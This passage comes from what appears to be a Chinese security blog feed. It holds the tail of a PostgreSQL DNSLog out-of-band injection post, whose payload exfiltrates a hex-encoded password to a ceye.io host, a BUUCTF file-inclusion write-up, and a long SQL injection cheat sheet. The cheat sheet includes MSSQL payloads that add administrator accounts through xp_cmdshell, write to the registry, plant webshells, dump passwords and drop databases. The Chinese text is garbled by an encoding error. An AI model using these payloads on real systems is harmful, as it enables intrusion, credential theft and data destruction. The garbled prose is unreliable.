(ç”¨äºå¾—åˆ°ç»™å®šçš„æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶å¤¹åˆ—è¡¨)</span><br><span class="line"></span><br><span class="line">### postgres-DNSLogå¤–å¸¦æ³¨å…¥ï¼š</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;pgSQL.php?id&#x3D;1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   DROP TABLE IF EXISTS table_output; &#x2F;&#x2F;åˆ¤æ–­table_outputè¿™ä¸ªè¡¨æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨å°±åˆ æ‰</span><br><span class="line"></span><br><span class="line">   CREATE TABLE table_output(content text);&#x2F;&#x2F;åˆ›å»ºtable_outputè¡¨</span><br><span class="line"></span><br><span class="line">  CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE      exec_cmd TEXT;&#x2F;&#x2F;å¼€å§‹å®šä¹‰temp_function()å‡½æ•°</span><br><span class="line"></span><br><span class="line">  DECLARE query_result TEXT;&#x2F;&#x2F;å®šä¹‰query_result æ¸¸æ ‡ï¼Œæ•°æ®ç±»å‹ä¸ºtext</span><br><span class="line"></span><br><span class="line">  BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user          where id &#x3D;1);&#x2F;&#x2F;BEGINä¸ºtemp_function()å‡½æ•°å†…å®¹å¼€å§‹åœ°æ–¹ï¼ŒæŠŠæŸ¥è¯¢çš„æ•°æ®æ’å…¥ query_resultæ¸¸æ ‡ä¸­</span><br><span class="line"></span><br><span class="line"> exec_cmd :&#x3D; E&#39;COPY table_output(content) FROM   E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;&#x2F;&#x2F;COPY (ç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å’Œè¡¨ä¹‹é—´æ‹·è´æ•°æ®)</span><br><span class="line"></span><br><span class="line">  EXECUTE exec_cmd;</span><br><span class="line"></span><br><span class="line">  END;&#x2F;&#x2F;temp_function()å‡½æ•°ç»“æŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$$ LANGUAGE plpgSQL SECURITY DEFINER;&#x2F;&#x2F;è®¾ç½®è¢«è°ƒç”¨æ—¶çš„è§’è‰²ï¼Œä»¥åŠå‚æ•°</span><br><span class="line"></span><br><span class="line">SELECT temp_function();&#x2F;&#x2F;æ‰§è¡Œtemp_function()å‡½æ•°</span><br></pre></td></tr></table></figure><h6 id="æ³¨æ„ï¼š-2"><a href="#æ³¨æ„ï¼š-2" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>PostgreSQLæ”¯æŒæ— éœ€åˆ›å»ºå‡ºæ¥å³å¯æ‰§è¡Œçš„functionã€‚<br>PostgreSQLæ•°æ®ç±»å‹ä¸­çš„textï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªé•¿åº¦ä¸å—é™åˆ¶çš„å­—ç¬¦ä¸²ï¼Œå°±åƒ varchar ä¸€æ ·ï¼Œåªæ˜¯ä¸éœ€è¦å®šä¹‰æœ€å¤§é•¿åº¦ã€‚è¿™æ˜¯ä¸€ä¸ª PostgreSQL é’ˆå¯¹ SQL æ ‡å‡†åšçš„æ‰©å±•ã€‚<br>security definerå­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå¯ä»¥ç»•è¿‡è¶…çº§ç®¡ç†å‘˜è®¾ç½®çš„è®¤è¯ã€‚</p><h1 id="é˜²å¾¡ï¼š"><a href="#é˜²å¾¡ï¼š" class="headerlink" title="é˜²å¾¡ï¼š"></a>é˜²å¾¡ï¼š</h1><p>ä¸ºäº†é¢„é˜²æ‰€æœ¬æ–‡æè¿°çš„æ”»å‡»ï¼Œé¦–å…ˆè¦é¿å…SQLIå…·æœ‰æœ€é«˜çš„ä¼˜å…ˆæƒï¼Œä¸ºåœ¨è¿™é‡Œæˆ‘ä»¬è¯­å¥éƒ½æ˜¯å‡å®šæ˜¯æœ€é«˜æƒé™ï¼Œå› ä¸ºåœ¨æŸäº›æ•°æ®åº“ï¼Œä½æƒé™ç”¨æˆ·ä½¿ç”¨å‡½æ•°å°†å—åˆ°é™åˆ¶ã€‚<br>ä½¿ç”¨é¢„å¤„ç†è¯­å¥è¢«è®¤ä¸ºæ˜¯æœ€å®‰å…¨çš„é¢„é˜²æªæ–½ï¼Œå¤„ç†è¯­å¥èƒ½åœ¨SQLå‘½ä»¤è¢«æ’å…¥çš„æ—¶å€™ç¡®ä¿æŸ¥è¯¢çš„æ„å›¾ä¸è¢«æ”»å‡»è€…æ”¹å˜,ä½†åƒmagic_quote()å’Œaddslashes()é‚£æ ·çš„å„ç§ç¦åˆ¶æœºåˆ¶å¹¶ä¸èƒ½å®Œå…¨é˜²æ­¢SQLIæ¼æ´çš„å­˜åœ¨æˆ–åˆ©ç”¨ï¼Œå› ä¸ºåœ¨æŸäº›æŠ€æœ¯é…åˆä½¿ç”¨çš„ç¯å¢ƒæ¡ä»¶ä¸‹ï¼Œæ”»å‡»è€…ä»èƒ½åˆ©ç”¨è¯¥æ¼æ´ã€‚<br>ä¸ºäº†æˆåŠŸæœ€åç¼“è§£DNSæ¸—å‡ºæ”»å‡»ï¼Œç®¡ç†å‘˜å¿…é¡»ç¡®ä¿æ‰€æœ‰ä¸å¿…è¦çš„ç³»ç»Ÿå­ç¨‹åºçš„æ‰§è¡Œæ˜¯è¢«é™åˆ¶çš„ã€‚å¦‚æœä¸€åˆ‡éƒ½å¤±è´¥äº†ï¼Œæ”»å‡»è€…å¿…é¡»ä¸èƒ½å¤Ÿè¿è¡Œé‚£äº›å¯ä»¥å‘èµ·DNSè¯·æ±‚çš„ç¨‹åºã€‚ç°åœ¨æœ‰ä¸€äº›æ£€æµ‹åŸŸå†…DNSæµé‡ä¸­æ¶æ„æ´»åŠ¨çš„å·¥ä½œï¼Œä½†å¤§å¤šç¼ºä¹å®é™…å’Œä¸»æµçš„è§£å†³æ–¹æ¡ˆï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¹¶ä¸æåŠã€‚<br>SqlMapå·²ç»å¯¹å®ƒå®ç°æ”¯æŒï¼Œå› æ­¤æ‰€æœ‰äººéƒ½å¯ä»¥å¯¹å®ƒè¿›è¡Œè¿›ä¸€æ­¥ç ”ç©¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNSLog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFåšé¢˜è®°å½•</title>
      <link href="2020/10/18/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/10/18/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šè®°å½•ä¸€äº›BUUCTFä¸­æœ‰è¶£çš„é¢˜ç›®</p></blockquote><h2 id="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h2><p>è€åƒå±‚é¥¼äº†ï¼Œè¯ä¸å¤šè¯´ç›´æ¥æŠ“åŒ…<br>hederæ€»ç»“å›¾ç‰‡æ¥è‡ª<a href="https://www.cnblogs.com/benbenfishfish/p/5821091.html">https://www.cnblogs.com/benbenfishfish/p/5821091.html</a></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/445559850.png"></p><p>åšé¢˜å…ˆäº†è§£ä¸€ä¸‹è¯·æ±‚å¤´ã€‚<br>å…ˆä»»æ„ç”¨æˆ·å¯†ç ç™»é™†ï¼ŒæŠ“åŒ…ã€‚BPæœ€åèƒ½çœ‹åˆ°L0gin.phpã€‚è®¿é—®å°±å®Œäº‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2860326870.png"></p><p>ç„¶åçœ‹åŒ…çš„æœ€åï¼ˆåé¢éƒ½ä¸€æ ·çš„æµç¨‹ï¼‰çŸ¥é“æ”¹å˜cookieæ—¶é—´æˆ³ä½¿å¾—æ›´å¤§</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/893841919.png"></p><p>æ·»åŠ client</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/442618896.png"></p><p>æ·»åŠ referer</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2557710892.png"></p><p>ä¿®æ”¹æµè§ˆå™¨ç±»å‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264389772.png"></p><p>æ·»åŠ from</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3612715797.png"></p><p>æ·»åŠ ä»£ç†via</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1863698420.png"></p><p>æœ€åbase64è§£ç </p><h2 id="had-a-bad-day"><a href="#had-a-bad-day" class="headerlink" title="had a bad day"></a>had a bad day</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/163551014.png"></p><p>ç‚¹å‡»ä¸‹é¢ä¸¤ä¸ªbuttonå‘ç°å›¾ç‰‡å˜åŒ–ï¼Œå†çœ‹urlä¸­å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3772625024.png"></p><p>æ„Ÿè§‰æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯ä»¥phpä¼ªåè®®æ¥è·å–æºç php://filter/read=convert.base64-encode/resource=./index.php ç„¶åæŠ¥é”™äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3787161977.png"></p><p>ç„¶ååˆ æ‰.phpçš„è¯å°±è¡Œäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/765056299.png"></p><p>è§£ç ä¹‹åä»£ç å®¡è®¡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3527358803.png"></p><p>è¦åŒæ—¶ä¼ å…¥woofers,(meowers)indexæ‰èƒ½åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œé‚£ä¹ˆæ„é€ å‡ºæ¥ /index.php?category=woofers/../flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/419776247.png"></p><p>æˆåŠŸåŒ…å«flag.phpï¼Œç„¶åçœ‹è§ç»¿è‰²çš„å­—ï¼Œè¿˜å·®ç‚¹å§¿åŠ¿å•Šã€‚é‚£å°±å†æ¥ä¸€æ¬¡phpä¼ªåè®®ã€‚<br>index.php?category=php://filter/read=convert.base64-encode/resource/flagã€‚æŠ¥é”™ï¼Œç»™å¿˜äº†è¦æ”¾ä¸€ä¸ªindexæˆ–è€…meowersæˆ–è€…woofersæ‰èƒ½æ»¡è¶³æ¡ä»¶ã€‚é‚£ä¹ˆå°±æ„é€ index.php?category=php://filter/read=convert.base64-encode/indexæˆ–è€…meowesæˆ–è€…woofers/resource/flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4284695946.png"></p><p>è§£ç å°±å‡ºflagäº†</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ‰‹å·¥æ³¨å…¥</title>
      <link href="2020/10/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>2020/10/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åŸæ–‡ï¼š<a href="https://www.cnblogs.com/cmt/p/14553189.html">https://www.cnblogs.com/cmt/p/14553189.html</a></p></blockquote><p>çœ‹çœ‹ä¸‹é¢çš„<br>1.åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥<br>;and 1=1<br>;and 1=2</p><p>2.åˆæ­¥åˆ¤æ–­æ˜¯å¦æ˜¯mssql<br>;and user&gt;0</p><p>3.åˆ¤æ–­æ•°æ®åº“ç³»ç»Ÿ<br>;and (select count(<em>) from sysobjects)&gt;0 mssql<br>;and (select count(</em>) from msysobjects)&gt;0 access</p><p>4.æ³¨å…¥å‚æ•°æ˜¯å­—ç¬¦<br>â€˜and [æŸ¥è¯¢æ¡ä»¶] and â€˜â€™=â€™</p><p>5.æœç´¢æ—¶æ²¡è¿‡æ»¤å‚æ•°çš„<br>â€˜and [æŸ¥è¯¢æ¡ä»¶] and â€˜%25â€™=â€™</p><p>6.çŒœæ•°æ®åº“<br>;and (select Count(*) from [æ•°æ®åº“å])&gt;0</p><p>7.çŒœå­—æ®µ<br>;and (select Count(å­—æ®µå) from æ•°æ®åº“å)&gt;0</p><p>8.çŒœå­—æ®µä¸­è®°å½•é•¿åº¦<br>;and (select top 1 len(å­—æ®µå) from æ•°æ®åº“å)&gt;0</p><p>9.(1)çŒœå­—æ®µçš„asciiå€¼ï¼ˆaccessï¼‰<br>;and (select top 1 asc(mid(å­—æ®µå,1,1)) from æ•°æ®åº“å)&gt;0</p><p>(2)çŒœå­—æ®µçš„asciiå€¼ï¼ˆmssqlï¼‰<br>;and (select top 1 unicode(substring(å­—æ®µå,1,1)) from æ•°æ®åº“å)&gt;0</p><p>10.æµ‹è¯•æƒé™ç»“æ„ï¼ˆmssqlï¼‰<br>;and 1=(select IS_SRVROLEMEMBER(â€˜sysadminâ€™));â€“<br>;and 1=(select IS_SRVROLEMEMBER(â€˜serveradminâ€™));â€“<br>;and 1=(select IS_SRVROLEMEMBER(â€˜setupadminâ€™));â€“<br>;and 1=(select IS_SRVROLEMEMBER(â€˜securityadminâ€™));â€“<br>;and 1=(select IS_SRVROLEMEMBER(â€˜diskadminâ€™));â€“<br>;and 1=(select IS_SRVROLEMEMBER(â€˜bulkadminâ€™));â€“<br>;and 1=(select IS_MEMBER(â€˜db_ownerâ€™));â€“</p><p>11.æ·»åŠ mssqlå’Œç³»ç»Ÿçš„å¸æˆ·<br>;exec master.dbo.sp_addlogin username;â€“<br>;exec master.dbo.sp_password null,username,password;â€“<br>;exec master.dbo.sp_addsrvrolemember sysadmin username;â€“<br>;exec master.dbo.xp_cmdshell â€˜net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /addâ€™;â€“<br>;exec master.dbo.xp_cmdshell â€˜net user username password /addâ€™;â€“<br>;exec master.dbo.xp_cmdshell â€˜net localgroup administrators username /addâ€™;â€“</p><p>12.(1)éå†ç›®å½•<br>;create table dirs(paths varchar(100), id int)<br>;insert dirs exec master.dbo.xp_dirtree â€˜c:â€™<br>;and (select top 1 paths from dirs)&gt;0<br>;and (select top 1 paths from dirs where paths not in(â€˜ä¸Šæ­¥å¾—åˆ°çš„pathsâ€™))&gt;)</p><p>(2)éå†ç›®å½•<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));â€“<br>;insert temp exec master.dbo.xp_availablemedia;â€“ è·å¾—å½“å‰æ‰€æœ‰é©±åŠ¨å™¨<br>;insert into temp(id) exec master.dbo.xp_subdirs â€˜c:â€™;â€“ è·å¾—å­ç›®å½•åˆ—è¡¨<br>;insert into temp(id,num1) exec master.dbo.xp_dirtree â€˜c:â€™;â€“ è·å¾—æ‰€æœ‰å­ç›®å½•çš„ç›®å½•æ ‘ç»“æ„<br>;insert into temp(id) exec master.dbo.xp_cmdshell â€˜type c:webindex.aspâ€™;â€“ æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹</p><p>13.mssqlä¸­çš„å­˜å‚¨è¿‡ç¨‹<br>xp_regenumvalues æ³¨å†Œè¡¨æ ¹é”®, å­é”®<br>;exec xp_regenumvalues â€˜HKEY_LOCAL_MACHINEâ€™,â€™SOFTWAREMicrosoftWindowsCurrentVersionRunâ€™ ä»¥å¤šä¸ªè®°å½•é›†æ–¹å¼è¿”å›æ‰€æœ‰é”®å€¼<br>xp_regread æ ¹é”®,å­é”®,é”®å€¼å<br>;exec xp_regread â€˜HKEY_LOCAL_MACHINEâ€™,â€™SOFTWAREMicrosoftWindowsCurrentVersionâ€™,â€™CommonFilesDirâ€™ è¿”å›åˆ¶å®šé”®çš„å€¼<br>xp_regwrite æ ¹é”®,å­é”®, å€¼å, å€¼ç±»å‹, å€¼<br>å€¼ç±»å‹æœ‰2ç§REG_SZ è¡¨ç¤ºå­—ç¬¦å‹,REG_DWORD è¡¨ç¤ºæ•´å‹<br>;exec xp_regwrite â€˜HKEY_LOCAL_MACHINEâ€™,â€™SOFTWAREMicrosoftWindowsCurrentVersionâ€™,â€™TestvalueNameâ€™,â€™reg_szâ€™,â€™helloâ€™ å†™å…¥æ³¨å†Œè¡¨<br>xp_regdeletevalue æ ¹é”®,å­é”®,å€¼å<br>exec xp_regdeletevalue â€˜HKEY_LOCAL_MACHINEâ€™,â€™SOFTWAREMicrosoftWindowsCurrentVersionâ€™,â€™TestvalueNameâ€™ åˆ é™¤æŸä¸ªå€¼<br>xp_regdeletekey â€˜HKEY_LOCAL_MACHINEâ€™,â€™SOFTWAREMicrosoftWindowsCurrentVersionTestkeyâ€™ åˆ é™¤é”®,åŒ…æ‹¬è¯¥é”®ä¸‹æ‰€æœ‰å€¼</p><p>14.mssqlçš„backupåˆ›å»ºwebshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (â€˜â€™);<br>backup database model to disk=â€™c:l.aspâ€™;</p><p>15.mssqlå†…ç½®å‡½æ•°<br>;and (select @@ version)&gt;0 è·å¾—Windowsçš„ç‰ˆæœ¬å·<br>;and user_name()=â€™dboâ€™ åˆ¤æ–­å½“å‰ç³»ç»Ÿçš„è¿æ¥ç”¨æˆ·æ˜¯ä¸æ˜¯sa<br>;and (select user_name())&gt;0 çˆ†å½“å‰ç³»ç»Ÿçš„è¿æ¥ç”¨æˆ·<br>;and (select db_name())&gt;0 å¾—åˆ°å½“å‰è¿æ¥çš„æ•°æ®åº“</p><p>16.ç®€æ´çš„webshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (â€˜â€™);<br>backup database model to disk=â€™g:wwwtestl.aspâ€™;</p><p>è¯·æ±‚çš„æ—¶å€™ï¼Œåƒè¿™æ ·å­ç”¨ï¼š<br><a href="http://ip/l.asp?c=dir">http://ip/l.asp?c=dir</a></p><p>SQLæ‰‹å·¥æ³¨å…¥å¤§å…¨</p><p>å‰æéœ€è¦å·¥å…·ï¼šSQL Query Analyzerå’ŒSqlExec Sunx Version</p><p>1.å»æ‰xp_cmdshellæ‰©å±•è¿‡ç¨‹çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼š</p><p>if exists (select * from dbo.sysobjects where id=object_id(Nâ€™[dbo].[xpcmdshell]â€™) and OBJECTPROPERTY(id,Nâ€™IsExtendedProcâ€™)=1)<br>exec sp_dropextendedproc Nâ€™[dbo].[xp_cmdshell]â€™</p><p>2.æ·»åŠ xp_cmdshellæ‰©å±•è¿‡ç¨‹çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼š</p><p>ï¼ˆ1ï¼‰SQL Query Analyzer</p><p>sp_addextendedproc xp_cmdshell,@ dllname=â€™xplog70.dllâ€™</p><p>ï¼ˆ2ï¼‰é¦–å…ˆåœ¨SqlExec Sunx Versionçš„Formaté€‰é¡¹é‡Œå¡«ä¸Š%sï¼Œåœ¨CMDé€‰é¡¹é‡Œè¾“å…¥</p><p>sp_addextendedproc â€˜xp_cmdshellâ€™,â€™xpsql70.dllâ€™</p><p>å»é™¤</p><p>sp_dropextendedproc â€˜xp_cmdshellâ€™</p><p>ï¼ˆ3ï¼‰MSSQL2000</p><p>sp_addextendedproc â€˜xp_cmdshellâ€™,â€™xplog70.dllâ€™</p><p>?</p><p>SQLæ‰‹å·¥æ³¨å…¥æ–¹æ³•æ€»ç»“(SQL Server2005)2010-01-28 16:17â€”â€”â€”ä»¥ä¸‹ä»¥çœç•¥æ³¨å…¥ç‚¹ç”¨URLä»£æ›¿</p><p>â€“(1) <em><strong>*æŸ¥çœ‹é©±åŠ¨å™¨æ–¹æ³•*</strong></em>**</p><p>â€“ å»ºè¡¨p(iä¸ºè‡ªåŠ¨ç¼–å·,aè®°å½•ç›˜ç¬¦ç±»ä¼¼â€c:â€,bè®°å½•å¯ç”¨å­—èŠ‚,å…¶å®ƒçœç•¥)<br>URL;create table p(i int identity(1,1),a nvarchar(255),b nvarchar(255),c nvarchar(255),d nvarchar(255));â€“</p><p>URL;insert p exec xp_availablemedia;â€“åˆ—å‡ºæ‰€æœ‰é©±åŠ¨å™¨å¹¶æ’å…¥è¡¨p</p><p>URL;and (select count(*) from p)&gt;3;â€“æŠ˜åŠæ³•æŸ¥å‡ºé©±åŠ¨å™¨æ€»æ•°</p><p>URL;and ascii(substring((select a from p where i=1),1,1))=67;â€“æŠ˜åŠæ³•æŸ¥å‡ºé©±åŠ¨å™¨å(æ³¨asc(c)=67)</p><p>â€“ä¸Šé¢ä¸€èˆ¬ç”¨äºæ— æ˜¾é”™æƒ…å†µä¸‹ä½¿ç”¨â€”â€”-ä»¥æ­¤ç±»æ¨,å¾—åˆ°æ‰€æœ‰é©±åŠ¨å™¨å</p><p>URL;and (select a from p where i=1)&gt;3;â€“æŠ¥é”™å¾—åˆ°ç¬¬ä¸€ä¸ªé©±åŠ¨å™¨å</p><p>â€“ä¸Šé¢ä¸€èˆ¬ç”¨äºæ˜¾é”™æƒ…å†µä¸‹ä½¿ç”¨â€”â€”-ä»¥æ­¤ç±»æ¨,å¾—åˆ°æ‰€æœ‰é©±åŠ¨å™¨å</p><p>URL;;drop table p;â€“åˆ é™¤è¡¨p</p><p>â€“(2) <em><strong>*æŸ¥çœ‹ç›®å½•æ–¹æ³•*</strong></em>**</p><p>URL;create table pa(m nvarchar(255),i nvarchar(255));â€“å»ºè¡¨pa(mè®°å½•ç›®å½•,iè®°å½•æ·±åº¦)</p><p>URL;insert pa exec xp_dirtree â€™e:â€™;â€“åˆ—å‡ºé©±åŠ¨å™¨eå¹¶æ’å…¥è¡¨pa</p><p>URL;and (select count(*) from pa where i&gt;0)&gt;-1;â€“æŠ˜åŠæ³•æŸ¥å‡ºiæ·±åº¦</p><p>URL;and (select top 1 m from pa where i=1 and m not in(select top 0 m from pa))&gt;0;â€“æŠ¥é”™å¾—åˆ°æ·±åº¦i=1çš„ç¬¬ä¸€ä¸ªç›®å½•å</p><p>â€“ä¸Šé¢ä¸€èˆ¬ç”¨æ˜¾é”™ä¸”ç›®å½•åä¸ä¸ºæ•°å­—æƒ…å†µä¸‹ä½¿ç”¨â€”â€”-(å¾—åˆ°ç¬¬äºŒä¸ªç›®å½•æŠŠâ€top 0â€æ¢ä¸ºâ€top 1â€,æ¢æ·±åº¦åªæ¢iå°±è¡Œ)ä»¥æ­¤ç±»æ¨,å¾—åˆ°eç›˜çš„æ‰€æœ‰ç›®å½•</p><p>URL;and len((select top 1 m from pa where i=1 and m not in(select top 0 m from pa)))&gt;0;â€“æŠ˜åŠæ³•æŸ¥å‡ºæ·±åº¦i=1çš„ç¬¬ä¸€ä¸ªç›®å½•åçš„é•¿åº¦</p><p>URL;and ascii(substring((select top 1 m from pa where i=1 and m not in(select top 0 m from pa)),1,1))&gt;0;â€“æŠ˜åŠæ³•æŸ¥å‡ºæ·±åº¦i=1çš„ç¬¬ä¸€ä¸ªç›®å½•åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦é•¿åº¦</p><p>â€“ä¸Šé¢ä¸€èˆ¬ç”¨æ— æ˜¾é”™æƒ…å†µä¸‹ä½¿ç”¨â€”â€”-(å¾—åˆ°ç¬¬äºŒä¸ªç›®å½•æŠŠâ€top 0â€æ¢ä¸ºâ€top 1â€,æ¢æ·±åº¦åªæ¢iå°±è¡Œ)ä»¥æ­¤ç±»æ¨,å¾—åˆ°eç›˜çš„æ‰€æœ‰ç›®å½•</p><p>URL;drop</p><p>æ‰‹å·¥MSSQLæ³¨å…¥å¸¸ç”¨SQLè¯­å¥<br>and exists (select * from sysobjects) //åˆ¤æ–­æ˜¯å¦æ˜¯MSSQL<br>and exists(select * from tableName) //åˆ¤æ–­æŸè¡¨æ˜¯å¦å­˜åœ¨..tableNameä¸ºè¡¨å<br>and 1=(select @@ VERSION) //MSSQLç‰ˆæœ¬<br>And 1=(select db_name()) //å½“å‰æ•°æ®åº“å<br>and 1=(select @@ servername) //æœ¬åœ°æœåŠ¡å<br>and 1=(select IS_SRVROLEMEMBER(â€˜sysadminâ€™)) //åˆ¤æ–­æ˜¯å¦æ˜¯ç³»ç»Ÿç®¡ç†å‘˜<br>and 1=(Select IS_MEMBER(â€˜db_ownerâ€™)) //åˆ¤æ–­æ˜¯å¦æ˜¯åº“æƒé™<br>and 1= (Select HAS_DBACCESS(â€˜masterâ€™)) //åˆ¤æ–­æ˜¯å¦æœ‰åº“è¯»å–æƒé™<br>and 1=(select name from master.dbo.sysdatabases where dbid=1) //æš´åº“åDBIDä¸º1ï¼Œ2ï¼Œ3â€¦.<br>  ; declare @ d int //æ˜¯å¦æ”¯æŒå¤šè¡Œ<br>and 1=(Select count(<em>) FROM master.dbo.sysobjects Where xtype = â€˜Xâ€™ AND name = â€˜xp_cmdshellâ€™) //åˆ¤æ–­XP_CMDSHELLæ˜¯å¦å­˜åœ¨<br>and 1=(select count(</em>) FROM master.dbo.sysobjects where name= â€˜xp_regreadâ€™) //æŸ¥çœ‹XP_regreadæ‰©å±•å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸æ˜¯å·²ç»è¢«åˆ é™¤<br>æ·»åŠ å’Œåˆ é™¤ä¸€ä¸ªSAæƒé™çš„ç”¨æˆ·testï¼šï¼ˆéœ€è¦SAæƒé™ï¼‰<br>exec master.dbo.sp_addlogin test,password<br>exec master.dbo.sp_addsrvrolemember test,sysadmin<br>åœæ‰æˆ–æ¿€æ´»æŸä¸ªæœåŠ¡ã€‚ ï¼ˆéœ€è¦SAæƒé™ï¼‰<br>exec master..xp_servicecontrol â€˜stopâ€™,â€™scheduleâ€™<br>exec master..xp_servicecontrol â€˜startâ€™,â€™scheduleâ€™<br>æš´ç½‘ç«™ç›®å½•<br>create table labeng(lala nvarchar(255), id int)<br>DECLARE @ result varchar(255) EXEC master.dbo.xp_regread â€˜HKEY_LOCAL_MACHINEâ€™,â€™SYSTEMControlSet001ServicesW3SVCParametersVirtual Rootsâ€™,â€™/â€™,@ result output insert into labeng(lala) values(@ result);<br>and 1=(select top 1 lala from labeng) æˆ–è€…and 1=(select count(<em>) from labeng where lala&gt;1)<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”åˆ†å‰²<br>SQL Server<br>åˆ¤æ–­æ˜¯å¦å¯æ³¨å°„ï¼š<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a><br><a href="http://www.exehack.net/article.asp?id=6%E2%80%B2">http://www.exehack.net/article.asp?id=6â€²</a><br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and 1=1<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and 1=2<br><a href="http://www.exehack.net/article.asp?action=value%E2%80%99">http://www.exehack.net/article.asp?action=valueâ€™</a> and 1=1<br><a href="http://www.exehack.net/article.asp?action=value%E2%80%99">http://www.exehack.net/article.asp?action=valueâ€™</a> and 1=2<br>searchpoints%â€™ and 1=1<br>searchpoints%â€™ and 1=2<br>ç¡®å®šæ•°æ®åº“ç±»å‹ï¼š<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and user&gt;0<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and (select count(</em>) from sysobjects)&gt;0<br>æŸ¥è¯¢å½“å‰ç”¨æˆ·æ•°æ®ä¿¡æ¯ï¼š<br>article.asp?id=6 having 1=1â€“<br>æš´å½“å‰è¡¨ä¸­çš„åˆ—ï¼š<br>article.asp?id=6 group by admin.username having 1=1â€“<br>article.asp?id=6 group by admin.username,admin.password having 1=1â€“<br>æš´ä»»æ„è¡¨å’Œåˆ—ï¼š<br>and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1<br>and (select top col_name(object_id(â€˜adminâ€™),N) from sysobjects)&gt;1<br>æš´æ•°æ®åº“æ•°æ®ï¼š<br>and (select top 1 password from admin where id=N)&gt;1<br>ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š<br>;update admin set password=â€™ooooooâ€™ where username=â€™xxxâ€™<br>å¢æ·»æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š<br>;insert into admin values (xxx,oooooo)â€“<br>åˆ æ•°æ®åº“ï¼š<br>  ; drop database webdata<br>è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·åï¼šand user&gt;0<br>è·å–å½“å‰æ•°æ®åº“åï¼šand 